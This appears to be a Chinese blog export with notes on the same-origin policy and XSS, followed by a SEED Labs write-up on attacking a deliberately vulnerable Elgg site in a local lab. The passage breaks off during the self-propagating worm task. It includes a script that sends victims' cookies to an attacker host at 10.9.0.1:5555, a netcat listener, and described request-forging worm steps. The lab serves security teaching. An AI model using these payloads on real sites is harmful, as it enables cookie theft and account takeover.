Cookie包含隐私（比如存款总额），这些信息就会泄漏。更可怕的是，Cookie往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。</p><p>由此可见，"同源政策"是必需的，否则 Cookie可以共享，互联网就毫无安全可言了。</p><h3 id="限制范围">1.3 限制范围</h3><p>随着互联网的发展，"同源政策"越来越严格。目前，如果非同源，共有三种行为受到限制。</p><blockquote><p>（1） Cookie、LocalStorage 和 IndexDB 无法读取。</p><p>（2） DOM 无法获得。</p><p>（3） AJAX 请求不能发送。</p></blockquote><p>虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。下面，我将详细介绍，如何规避上面三种限制。</p><h1 id="cookie">2. Cookie</h1><p>Cookie是服务器写入浏览器的一小段信息，只有同源的网页才能共享。但是，两个网页一级域名相同，只是二级域名不同，浏览器允许通过设置<code>document.domain</code>共享Cookie。</p><p>举例来说，A网页是<code>http://w1.example.com/a.html</code>，B网页是<code>http://w2.example.com/b.html</code>，那么只要设置相同的<code>document.domain</code>，两个网页就可以共享Cookie。</p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">domain</span> = <span class="hljs-string">&#x27;example.com&#x27;</span>;<br></code></pre></td></tr></table></figure></blockquote><p>现在，A网页通过脚本设置一个 Cookie。</p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;test1=hello&quot;</span>;<br></code></pre></td></tr></table></figure></blockquote><p>B网页就可以读到这个 Cookie。</p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> allCookie = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;<br></code></pre></td></tr></table></figure></blockquote><p>注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexDB无法通过这种方法，规避同源政策，而要使用下文介绍的PostMessage API。</p><p>另外，服务器也可以在设置Cookie的时候，指定Cookie的所属域名为一级域名，比如<code>.example.com</code>。</p><blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>key=value; domain=.example.com; path=/<br></code></pre></td></tr></table></figure></blockquote><p>这样的话，二级域名和三级域名不用做任何设置，都可以读取这个Cookie。</p><h1 id="xss攻击">3. XSS攻击</h1><h2 id="概述">3.1 概述</h2><p>跨站脚本攻击（Cross-SiteScripting，简称XSS攻击）出现在上世纪90年代中，由于跨站脚本攻击的缩写和层叠样式表（CascadingStyleSheets，CSS）的缩写一样，为了防止混淆，故缩写成XSS攻击。XSS攻击是由于Web应用程序对用户输入过滤不足而产生的，使得攻击者输入的特定数据变成了JavaScript脚本或HTML代码。</p><h2 id="分类">3.2 分类</h2><h3 id="反射型xss">3.2.1 反射型XSS</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310312040585.png"alt="image-20231031202501135" /><figcaption aria-hidden="true">image-20231031202501135</figcaption></figure><p>反射型XSS是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句：<code>&lt;?php echo "&lt;p&gt;hello, $_GET['user']&lt;/p&gt;";?&gt;</code>，那么在访问时设置<code>/?user=&lt;/p&gt;&lt;script&gt;alert("hack")&lt;/script&gt;&lt;p&gt;</code>，则可执行预设好的JavaScript代码。</p><p>反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSSAuditor、NoScript等防御手段的影响较大。</p><p>特点：</p><ul><li>非持久型、参数型跨站脚本</li><li>恶意脚本附加到URL地址参数中</li></ul><p>攻击技巧：生成短网址隐藏具体内容</p><h3 id="存储型xss">3.2.2 存储型XSS</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310312040586.png"alt="image-20231031201645055" /><figcaption aria-hidden="true">image-20231031201645055</figcaption></figure><p>储存型XSS相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。</p><p>特点：</p><ul><li>持久型</li><li>一般攻击存在留言、评论、博客日志中</li><li>恶意脚本被存储在服务端的数据库中</li></ul><h3 id="dom型xss">3.2.3 DOM型XSS</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310312040587.png"alt="image-20231031202521509" /><figcaption aria-hidden="true">image-20231031202521509</figcaption></figure><p>DOM型XSS是基于DOM文档对象模型的一种漏洞。严格地说，DOM型XSS其实算反射型XSS，区别在于DOM型XSS并不会和后台进行交互，是完完全全的Web前端安全问题，要做防御也只能在客户端上进行防御。</p><p>首先，客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它并不与服务端进行交互而是从客户端获得DOM中的数据（如从URL中获取数据）并在本地执行；其次，浏览器用户可以操纵DOM中的一些对象如URL、location等；因此，当攻击者可以控制一些DOM对象、输入一些恶意JS代码，而客户端的脚本并没有对用户输入内容进行有效的过滤就传入一些执行危险操纵的函数如eval等或直接输出到页面时，就会导致DOM型XSS漏洞的存在。</p><h3 id="区别">3.2.4 区别</h3><p><strong>一、被攻击对象的不同</strong>反射型XSS的被攻击对象一般是攻击者去寻找的，就比如说：一个攻击者想盗取A的QQ号，那么攻击者就可以将一个含有反射型XSS的URL链接给A，此时我们可以看出，需要将特定的URL，注意是特定的URL给A，当A点击进入链接时，就受到XSS攻击，所以这种攻击范围不是特别的广。</p><p>而存储型XSS是广撒网的方式或者指定的方式，就是攻击者将存储型XSS放在一些有XSS漏洞的网站上，只要有用户访问这个链接就会中招，而攻击者也可以寻找被攻击对象，比如说上面的例子，所以我们可以看出，存储型XSS的危害性更大，范围更广，可以不需要寻找被攻击对象，只要存储型XSS在服务器上就能实施攻击。</p><p>DOM型XSS的被攻击对象其实和反射型XSS被攻击对象差不多，就是给攻击对象放送URL。</p><p><strong>二、解析位置不同（个人感觉是反射型与存储型区别的本质）</strong>反射型XSS的脚本被解析的地方是浏览器，而存储型XSS的脚本被解析的地方是服务器，DOM型XSS也是浏览器，所以DOM型又叫DOM反射型XSS。但是反射型XSS需要联网，而DOM型不需要！</p><p><strong>三、存储时间不同</strong>反射型XSS是既有即用，没有持久性，而存储型XSS是存储在服务器上，只要服务器不挂机或者是被干掉，就一直会有，DOM型XSS和反射型差不多。</p><p><strong>四、允许输入点的不同（这是DOM型与其他两种的区别）</strong>一般情况下，反射型XSS在搜索框啊，或者是页面跳转啊这些地方，而存储型XSS一般是留言，或者用户存储的地方，而DOM呢？是在DOM位置上，不取决于输入环境上。</p><h2 id="攻击方式">3.3 攻击方式</h2><ul><li>cookie窃取</li><li>会话劫持：利用XSS攻击，冒用合法者的会话ID进行网络访问的一种攻击方式</li><li>网络钓鱼：可以执行JavaScript代码动态生成网页内容或直接注入HTML代码，从而产生网络钓鱼攻击</li><li>信息刺探：访问历史信息、端口信息、剪贴板内容、客户端IP地址、键盘信息等</li><li>网页挂马：将恶意脚本隐藏在Web网页中，当用户浏览该网页时，这些隐藏的恶意脚本将在用户不知情的情况下执行，下载并启动木马程序</li><li>XSS蠕虫：一般利用存储型XSS攻击，将一段JavaScript代码保存在服务器上，其他用户浏览相关信息时，会执行JavaScript代码，从而引发攻击</li></ul><h2 id="防范措施">3.4 防范措施</h2><ul><li>HttpOnly是另一个应用给cookie的标志，而且所有现代浏览器都支持它。HttpOnly标志的用途是指示浏览器禁止任何脚本访问cookie内容，这样就可以降低通过JavaScript发起的XSS攻击偷取cookie的风险。</li><li>安全编码：PHP语言中针对XSS攻击的安全编码函数有htmlentities和htmlspecialchars等，这些函数对特殊字符的安全编码方式如下：小于号（&lt;）转换成&amp;lt、大于号（&gt;）转换成&amp;gt、与符号（&amp;）转换成&amp;amp、双引号（"）转换成&amp;quot、单引号（'）转换成&amp;#39。</li></ul><p>参考教程：</p><ol type="1"><li>https://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html</li><li>https://websec.readthedocs.io/zh/latest/vuln/xss/classify.html</li><li>https://m.freebuf.com/articles/web/318982.html</li><li>https://cloud.tencent.com/developer/article/2076505</li></ol>]]></content>
    
    
    <categories>
      
      <category>网络攻防技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Cross-Site Scripting Attack</title>
    <link href="/2023/10/31/SEED-LABS/Web%20Security/Cross-Site%20Scripting%20Attack/"/>
    <url>/2023/10/31/SEED-LABS/Web%20Security/Cross-Site%20Scripting%20Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="overview">1. Overview</h1><p>跨站脚本（XSS）是web应用程序中常见的一种漏洞。攻击者可利用该漏洞向受害者的网络浏览器注入恶意代码（如JavaScript 程序），从而窃取受害者的凭证（如会话 cookie）。利用 XSS漏洞可以绕过浏览器为保护这些凭证而采用的访问控制策略（即同源策略）。</p><p>为了演示攻击者利用 XSS 漏洞可以做些什么，我们在预制的 Ubuntu虚拟机镜像中设置了一个名为 Elgg 的网络应用程序。Elgg是一个非常流行的社交网络开源网络应用程序，它已经采取了许多应对措施来消除XSS 威胁。为了演示 XSS 攻击的原理，我们在安装过程中注释了 Elgg中的这些应对措施，故意使 Elgg 容易受到 XSS攻击。如果没有这些应对措施，用户可以在用户配置文件中发布任何任意信息，包括JavaScript 程序。</p><p>在本实验室中，学生需要利用这一漏洞对修改后的 Elgg 发起 XSS攻击，攻击方式类似于 2005 年 Samy Kamkar 通过臭名昭著的 Samy 蠕虫病毒对MySpace 所做的攻击。这种攻击的最终目的是在用户中传播 XSS蠕虫，这样，无论谁浏览受感染的用户配置文件，都会被感染，而无论谁被感染，都会将你（即攻击者）添加到他/她的好友列表中。本实验室包括以下主题：</p><ul><li>跨站脚本攻击</li><li>XSS 蠕虫和自传播</li><li>会话 cookie</li><li>HTTP GET 和 POST 请求</li><li>JavaScript 和 Ajax</li><li>内容安全策略 (CSP)</li></ul><h1 id="lab-environment-setup">2. Lab Environment Setup</h1><h2 id="dns-setup">2.1 DNS Setup</h2><p>我们为本实验室建立了几个网站。它们由容器 10.9.0.5托管。我们需要将网络服务器的名称映射到该 IP 地址。请在 /etc/hosts中添加以下条目。您需要使用 root 权限来修改此文件：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650564.png"alt="image-20231208160254741" /><figcaption aria-hidden="true">image-20231208160254741</figcaption></figure><h2 id="container-setup-and-commands">2.2 Container Setup andCommands</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ docker-compose build <span class="hljs-comment"># Build the container image</span><br>$ docker-compose up <span class="hljs-comment"># Start the container</span><br>$ docker-compose down <span class="hljs-comment"># Shut down the container</span><br>// Aliases <span class="hljs-keyword">for</span> the Compose commands above<br>$ dcbuild <span class="hljs-comment"># Alias for: docker-compose build</span><br>$ dcup <span class="hljs-comment"># Alias for: docker-compose up</span><br>$ dcdown <span class="hljs-comment"># Alias for: docker-compose down</span><br><br>$ dockps // Alias <span class="hljs-keyword">for</span>: docker ps --format <span class="hljs-string">&quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span><br>$ docksh &lt;<span class="hljs-built_in">id</span>&gt; // Alias <span class="hljs-keyword">for</span>: docker <span class="hljs-built_in">exec</span> -it &lt;<span class="hljs-built_in">id</span>&gt; /bin/bash<br></code></pre></td></tr></table></figure><h2 id="elgg-web-application">2.3 Elgg Web Application</h2><p>在本实验中，我们使用一个名为 Elgg 的开源网络应用程序。Elgg是一个基于网络的社交网络应用程序。它已在提供的容器镜像中设置好；其 URL是 http://www.seed-server.com。我们使用两个容器，一个运行网络服务器（10.9.0.5），另一个运行 MySQL数据库（10.9.0.6）。这两个容器的 IP地址被硬编码在配置的不同地方，所以请不要从 docker-compose.yml文件中修改它们。</p><p><strong>MySQL数据库</strong>：容器通常是一次性的，因此一旦被销毁，容器内的所有数据都会丢失。在本实验室中，我们确实希望保留MySQL数据库中的数据，这样在关闭容器时就不会丢失我们的工作。为此，我们将主机上的mysql 数据文件夹（在 Labsetup 中，它将在 MySQL容器运行一次后创建）挂载到 MySQL 容器内的 /var/lib/mysql文件夹。该文件夹是 MySQL存储数据库的地方，因此即使容器被毁，数据库中的数据也会保留。如果确实想从一个干净的数据库开始，可以删除此文件夹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo <span class="hljs-built_in">rm</span> -rf mysql_data<br></code></pre></td></tr></table></figure><p><strong>用户账户</strong>：我们在 Elgg服务器上创建了几个用户账户，用户名和密码如下。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650565.png"alt="image-20231208160506237" /><figcaption aria-hidden="true">image-20231208160506237</figcaption></figure><h1 id="lab-tasks">3. Lab Tasks</h1><p>从 PDF文件复制和粘贴代码时，引号（尤其是单引号）经常会变成看起来相似的其他符号。如果出现这种情况，请删除它们，然后手动输入这些符号。</p><h2 id="preparation-getting-familiar-with-the-http-header-live-tool">3.1Preparation: Getting Familiar with the "HTTP Header Live" tool</h2><p>在本实验中，我们需要构建 HTTP 请求。要想知道 Elgg 中可接受的 HTTP请求是什么样的，我们需要能够捕获并分析 HTTP 请求。为此，我们可以使用Firefox 附加组件"HTTP HeaderLive"。在开始本实验之前，你应该先熟悉一下这个工具。</p><h2id="task-1-posting-a-malicious-message-to-display-an-alert-window">3.2Task 1: Posting a Malicious Message to Display an Alert Window</h2><p>此任务的目的是在您的 Elgg 配置文件中嵌入一个 JavaScript程序，这样当其他用户查看您的配置文件时，JavaScript程序就会被执行并显示一个警报窗口。以下 JavaScript程序将显示一个警报窗口：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">alert</span>(’<span class="hljs-variable constant_">XSS</span>’);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>如果您在个人档案中嵌入上述 JavaScript代码（例如在简要说明字段中），那么任何查看您个人档案的用户都会看到提示窗口。</p><p>在这种情况下，JavaScript代码足够短，可以输入到简短描述字段中。如果想运行较长的JavaScript，但又受限于在表单中键入的字符数，可以将 JavaScript程序存储在一个独立文件中，以 .js扩展名保存，然后使用<code>&lt;script&gt;</code>标记中的 src属性引用它。请参阅下面的示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;http://www.example.com/myscripts.js&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>在上例中，页面将从 http://www.example.com（可以是任何网络服务器）获取JavaScript 程序。</p><p><strong>实验流程：</strong></p><ol type="1"><li>登录攻击者（如Boby）账户，编辑profile，在BriefDescription处插入xss代码<code>&lt;script&gt;alter("this is a xss")&lt;/script&gt;</code>，点击保存。</li></ol><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650566.png"alt="image-20231208161127964" /><figcaption aria-hidden="true">image-20231208161127964</figcaption></figure><ol start="2" type="1"><li><p>登录受害者（如Samy）账户，查看Boby个人信息，成功显示弹窗，xss攻击生效。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650568.png"alt="image-20231208161210189" /><figcaption aria-hidden="true">image-20231208161210189</figcaption></figure></li></ol><h2 id="task-2-posting-a-malicious-message-to-display-cookies">3.3 Task2: Posting a Malicious Message to Display Cookies</h2><p>本任务的目的是在您的 Elgg 配置文件中嵌入一个 JavaScript程序，这样当其他用户查看您的配置文件时，该用户的 cookie就会显示在提示窗口中。这可以通过在上一个任务中的 JavaScript程序中添加一些额外代码来实现：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>实验流程：</strong></p><ol type="1"><li><p>基础知识：<code>document.cookie</code> 是 JavaScript中用于操作浏览器中的 cookie 的属性，允许 JavaScript 读取和写入浏览器中的cookie.</p></li><li><p>登录攻击者（如Samy）账户，编辑profile，在BriefDescription处插入xss代码(<code>&lt;script&gt;alter(document.cookie)&lt;/script&gt;</code>)，点击保存。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650569.png"alt="image-20231208161342999" /><figcaption aria-hidden="true">image-20231208161342999</figcaption></figure></li><li><p>登录受害者（如Boby）账户，查看Samy个人信息，成功显示弹窗，内容为cookie值，xss攻击生效。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650570.png"alt="image-20231208161401778" /><figcaption aria-hidden="true">image-20231208161401778</figcaption></figure></li></ol><h2 id="task-3-stealing-cookies-from-the-victims-machine">3.4 Task 3:Stealing Cookies from the Victim’s Machine</h2><p>在上一个任务中，攻击者编写的恶意 JavaScript 代码可以打印出用户的cookie，但只有用户可以看到 cookie，攻击者看不到。在本任务中，攻击者希望JavaScript 代码将 cookie 发送给自己。为此，恶意 JavaScript代码需要向攻击者发送 HTTP 请求，并在请求中附加 Cookie。</p><p>我们可以让恶意 JavaScript插入一个<code>&lt;img&gt;</code>标签，并将其 src属性设置为攻击者的机器。当 JavaScript 插入 img 标签时，浏览器会尝试从src 字段中的 URL 加载图片；这样就会向攻击者的机器发送 HTTP GET请求。下面给出的 JavaScript 会将 cookie 发送到攻击者机器（IP 地址为10.9.0.1）的 5555 端口，攻击者的 TCP 服务器会监听同一端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;document.write(’&lt;img src=http://10.9.0.1:5555?c=’<br>+ escape(document.cookie) + ’ &gt;’);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>攻击者常用的一个程序是 netcat（或 nc），如果使用"-l"选项运行，它就会成为一个 TCP服务器，监听指定端口上的连接。该服务器程序基本上是打印客户端发送的任何内容，并将运行服务器的用户键入的任何内容发送给客户端。键入下面的命令监听5555 端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nc -lknv 5555<br></code></pre></td></tr></table></figure><p>-l 选项用于指定 nc应侦听传入连接，而不是启动与远程主机的连接。-nv选项用于让nc提供更多的冗长输出。-k选项表示当一个连接完成后，监听另一个连接。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>攻击者（如Boby）在本地开启监听。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952902.png"alt="image-20231031193313293" /><figcaption aria-hidden="true">image-20231031193313293</figcaption></figure></li><li><p>攻击者（Boby）在个人信息BriefDescription处插入xss代码，点击保存。注意：IP地址为攻击者接收cookie的IP。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650571.png"alt="image-20231208161659680" /><figcaption aria-hidden="true">image-20231208161659680</figcaption></figure></li><li><p>受害者（如Samy）查看Boby个人信息，攻击者（Boby）在netcat输出信息中成功得到Samy的cookie.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952904.png"alt="image-20231031193433871" /><figcaption aria-hidden="true">image-20231031193433871</figcaption></figure></li></ol><h2 id="task-4-becoming-the-victims-friend">3.5 Task 4: Becoming theVictim’s Friend</h2><p>在本任务和下一个任务中，我们将执行类似于 2005 年 Samy 对 MySpace所做的攻击（即 Samy 蠕虫）。我们将编写一个 XSS 蠕虫，将访问 Samy页面的任何其他用户添加为 Samy 的好友。 该蠕虫不会自我传播；在任务 6中，我们将使其自我传播。</p><p>在这项任务中，我们需要编写一个恶意 JavaScript程序，在没有攻击者干预的情况下，直接从受害者的浏览器伪造 HTTP请求。攻击的目的是将 Samy 添加为受害者的好友。我们已经在 Elgg服务器上创建了一个名为 Samy 的用户（用户名为 samy）。</p><p>要为受害者添加好友，我们首先要弄清楚合法用户如何在 Elgg中添加好友。更具体地说，我们需要找出用户添加好友时发送到服务器的信息。Firefox的 HTTP 检查工具可以帮助我们获取信息。它可以显示从浏览器发送的任何 HTTP请求信息的内容。从内容中，我们可以识别请求中的所有参数。</p><p>了解添加好友 HTTP 请求的内容后，我们就可以编写 JavaScript程序来发送相同的 HTTP 请求。我们提供的 JavaScript代码骨架有助于完成这项任务。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650572.png"alt="image-20231208161905141" /><figcaption aria-hidden="true">image-20231208161905141</figcaption></figure><p>上述代码应放在 Samy 简介页面的 "关于我"字段中。该字段提供两种编辑模式：编辑器模式（默认）和文本模式。编辑器模式会在输入的文本中添加额外的HTML代码，而文本模式不会。由于我们不希望在攻击代码中添加任何额外代码，因此在输入上述JavaScript 代码之前，应启用<strong>文本模式</strong>。这可以通过点击"关于我 "文本字段右上角的 "编辑 HTML "来实现。</p><p><strong>问题</strong>：请回答以下问题</p><ul><li>问题1：解释第 ➀ 和 ➁ 行的目的，为什么需要它们？</li><li>问题2：如果 Elgg 应用程序只为 "关于我"字段提供编辑器模式，即您无法切换到文本模式，您还能成功发起攻击吗？</li></ul><p><strong>实验流程：</strong></p><ol type="1"><li><p>抓包查看正常添加Samy为好友时的HTTP请求信息。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650573.png"alt="image-20231208162040534" /><figcaption aria-hidden="true">image-20231208162040534</figcaption></figure></li><li><p>攻击者（Samy）根据正常请求编写xss代码，用于伪造请求添加好友，并将xss代码放至“Aboutme”区域，此处需要先选中"EditHTML"（文本模式）。代码流程：使用XMLHttpRequest对象构建并发送HTTPGET请求到一个特定的URL（sendurl），以完成添加Samy作为好友的操作。friend参数：用于标识Samy。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952906.png"alt="image-20231031193612175" /><figcaption aria-hidden="true">image-20231031193612175</figcaption></figure></li><li><p>受害者（Boby）访问Samy的个人主页，网页自动发起请求添加Samy，可以看到此时已经添加成功。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952907.png"alt="image-20231031193703403" /><figcaption aria-hidden="true">image-20231031193703403</figcaption></figure></li><li><p>问题一：ts可能是时间戳信息，用于安全验证或防止重放攻击；token可能是令牌信息，以进行身份验证或授权检查。每次请求时它们都是针对CSRF的安全措施，会动态变化，如果不添加这两个参数，无法实现认证，也就不能成功执行请求内容。</p></li><li><p>问题二：不能。以编辑器模式提交的xss代码被引入了code等标签，内容不会被作为代码执行。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952908.png"alt="image-20231031193743679" /><figcaption aria-hidden="true">image-20231031193743679</figcaption></figure></li></ol><h2 id="task-5-modifying-the-victims-profile">3.6 Task 5: Modifying theVictim’s Profile</h2><p>这项任务的目的是在受害者访问 Samy的页面时修改受害者的个人资料。具体来说，修改受害者的 "关于我"字段。我们将编写一个 XSS 蠕虫来完成任务。此蠕虫不会自我传播；在任务 6中，我们将使其自我传播。</p><p>与之前的任务类似，我们需要编写一个恶意 JavaScript程序，在没有攻击者干预的情况下直接从受害者的浏览器伪造 HTTP请求。要修改个人资料，我们首先要弄清楚合法用户如何编辑或修改 Elgg中的个人资料。更具体地说，我们需要弄清如何构建 HTTP POST请求来修改用户配置文件。我们将使用 Firefox 的 HTTP检查工具。了解修改用户配置文件 HTTP POST 请求的结构后，我们就可以编写JavaScript 程序来发送相同的 HTTP 请求。我们将提供一段 JavaScript代码骨架，以帮助完成这项任务。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650574.png"alt="image-20231208162301970" /><figcaption aria-hidden="true">image-20231208162301970</figcaption></figure><p>与任务 4 类似，上述代码应放在 Samy 个人资料页面的 "关于我"字段中，在输入上述 JavaScript 代码之前，应启用文本模式。</p><p><strong>问题</strong>：请回答以下问题</p><ul><li>问题 3：为什么需要第 ➀行？删除这一行，重复你的攻击。报告并解释您的观察结果。</li></ul><p><strong>实验流程：</strong></p><ol type="1"><li><p>基础知识："application/x-www-form-urlencoded" 使用 URL编码来表示数据，其中数据被编码为键值对，并使用 "&amp;"符号分隔键值对。例如，键值对 "name=John&amp;age=30" 表示名字为"John"，年龄为 "30" 的数据。</p></li><li><p>抓包查看正常修改“Aboutme”时的HTTP请求信息，获取到请求的url，以及发送的参数信息。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952909.png"alt="image-20231031193925006" /><figcaption aria-hidden="true">image-20231031193925006</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952910.png"alt="image-20231031193936065" /><figcaption aria-hidden="true">image-20231031193936065</figcaption></figure></li><li><p>攻击者（Samy）根据正常请求编写xss代码，用于伪造请求修改受害者的个人信息，并将xss代码放至“Aboutme”区域，此处需要先选中"EditHTML"（文本模式）。代码流程：获取当前用户的用户名、唯一标识符、时间戳和安全令牌；构建一个包含用户信息和其他数据的请求内容；检查当前用户的唯一标识符是否与指定值（59：Samy）不同；如果唯一标识符不同，创建一个HTTP POST 请求，将请求内容发送到指定的 URL.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952911.png"alt="image-20231031194020786" /><figcaption aria-hidden="true">image-20231031194020786</figcaption></figure></li><li><p>受害者（Boby）访问Samy的个人主页后，自身个人信息“Aboutme”被修改。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952912.png"alt="image-20231031194054556" /><figcaption aria-hidden="true">image-20231031194054556</figcaption></figure></li><li><p>问题三：防止攻击者（Samy）自己的“Aboutme”被修改。如果去掉这行代码，在攻击者保存输入的xss代码后，自身的“Aboutme”立即被改变，无法对别人实施攻击。</p></li></ol><h2 id="task-6-writing-a-self-propagating-xss-worm">3.7 Task 6: Writinga Self-Propagating XSS Worm</h2><p>要成为真正的蠕虫病毒，恶意 JavaScript程序必须能够自我传播。也就是说，每当一些人查看受感染的配置文件时，不仅他们的配置文件会被修改，蠕虫病毒也会传播到他们的配置文件中，进一步影响查看这些新感染配置文件的其他人。这样，查看受感染配置文件的人越多，蠕虫的传播速度就越快。这正是Samy蠕虫所使用的机制：在2005 年 10 月 4 日发布后的短短 20 小时内，就有超过 100万用户受到影响，使萨米蠕虫成为有史以来传播速度最快的病毒之一。能够实现这一目标的JavaScript代码被称为自传播跨站脚本蠕虫。在本任务中，您需要实现这样一种蠕虫，它不仅会修改受害者的个人资料并将用户"Samy"添加为好友，还会将蠕虫本身的副本添加到受害者的个人资料中，从而将受害者变成攻击者。</p><p>为了实现自我传播，当恶意 JavaScript修改受害者的配置文件时，它应该将自己复制到受害者的配置文件中。有几种方法可以实现这一目的，我们将讨论两种常见的方法。</p><p><strong>链接方法</strong>：如果在<code>&lt;script&gt;</code>标记中使用 src属性包含蠕虫，那么编写自传播蠕虫就容易得多。我们在任务 1 中讨论过 src属性，下面举例说明。蠕虫可以简单地将下面的<code>&lt;script&gt;</code>标记复制到受害者的配置文件中，从而用相同的蠕虫感染配置文件。</p><p><strong>DOM 方法</strong>：如果整个 JavaScript程序（即蠕虫）被嵌入到受感染的配置文件中，要将蠕虫传播到另一个配置文件，蠕虫代码可以使用DOM API 从网页中获取自身的副本。下面是一个使用 DOM API的示例。该代码获取自身的一个副本，并将其显示在一个警报窗口中：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081650575.png"alt="image-20231208162838903" /><figcaption aria-hidden="true">image-20231208162838903</figcaption></figure><p>需要注意的是，innerHTML（第 ➁行）只提供了代码的内部部分，不包括周围的脚本标记。我们只需添加开头标记<code>&lt;script id="worm"&gt;</code>（第 ➀ 行）和结尾标记<code>&lt;/script&gt;</code>（第 ➂行），即可形成恶意代码的相同副本。</p><p>在 HTTP POST 请求中发送数据时，如果 Content-Type 设置为<code>application/x-wwform-urlencoded</code>（我们代码中使用的类型），数据也应进行编码。这种编码方案被称为URL 编码，它将数据中的非字母字符替换为 %HH（一个百分号和代表字符 ASCII码的两个十六进制数字）。第 ➃ 行的 encodeURIComponent()函数用于对字符串进行 URL 编码。</p><p>注：在本实验室中，您可以尝试 Link 和 DOM 两种方法，但必须使用 DOM方法，因为它更具挑战性，而且不依赖外部 JavaScript 代码。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>攻击者（Samy）根据正常请求编写xss代码，用于伪造请求修改受害者的个人信息，并可以作为蠕虫传播，然后将xss代码放至“Aboutme”区域，此处需要先选中"Edit 